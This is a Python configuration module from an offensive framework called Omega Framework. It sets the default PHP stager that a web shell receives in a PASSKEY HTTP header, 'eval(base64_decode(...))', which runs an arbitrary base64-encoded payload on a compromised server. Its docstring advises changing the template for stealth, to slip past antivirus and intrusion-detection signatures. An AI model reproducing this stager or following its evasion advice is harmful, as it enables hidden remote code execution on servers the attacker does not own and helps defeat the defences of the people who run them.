#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Omega Framework                                
#            ---------------------------------------------------
#                  Copyright (C) <2020>  <Entynetproject>       
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

"""
Override default payload stager template.
It is used as PASSKEY HTTP Header value to execute the final
php payload.

This setting can be changed to improve stealth. Using a different
template than the default one is a good was to bypass static
Antivirus/IDS signatures.

Make sure that the global behavior remains the same.
Indeed, REQ_HEADER_PAYLOAD must base64_decode() '%%BASE64%%',
then eval() it to work properly.

NOTE: %%BASE64%% is a magic string that is replaced by the
      base64 payload to be executed at runtime.

* Only edit REQ_HEADER_PAYLOAD if you understand what you're doing
"""
import linebuf
import datatypes


linebuf_type = linebuf.RandLineBuffer


def validator(value):
    if value.find("%%BASE64%%") < 0:
        raise ValueError("shall contain %%BASE64%% string")
    return datatypes.PhpCode(value)


def default_value():
    return "eval(base64_decode(%%BASE64%%))"
